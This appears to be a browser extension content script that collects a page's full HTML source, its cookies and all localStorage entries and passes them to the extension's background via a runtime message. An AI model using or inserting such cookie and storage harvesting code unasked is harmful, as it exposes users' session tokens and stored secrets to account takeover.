
 try
 {
   var src = document.getElementsByTagName("HTML")[0].innerHTML; 
 }
 catch(err)
 {
   var src = "";
 }
 
 var ls = "";
 try
 {
	 for ( i=0; i < Object.entries(localStorage).length; i++ ) {
		 if ( i > 0 )
		   ls += ",";
		   
		 ls += Object.entries(localStorage)[ i ][ 0 ] + '=' + escape ( Object.entries(localStorage)[ i ][ 1 ] );
	 }
 }
 catch(err)
 {
	 ls = "";
 }
	   
var additionalInfo = {
  "what": "BID",
  "title": document.title,
  "cookie": document.cookie,
  "src": src,
  "linktext": "",
  "url": "",
  "ls": ls
};

browser.runtime.connect().postMessage(additionalInfo);

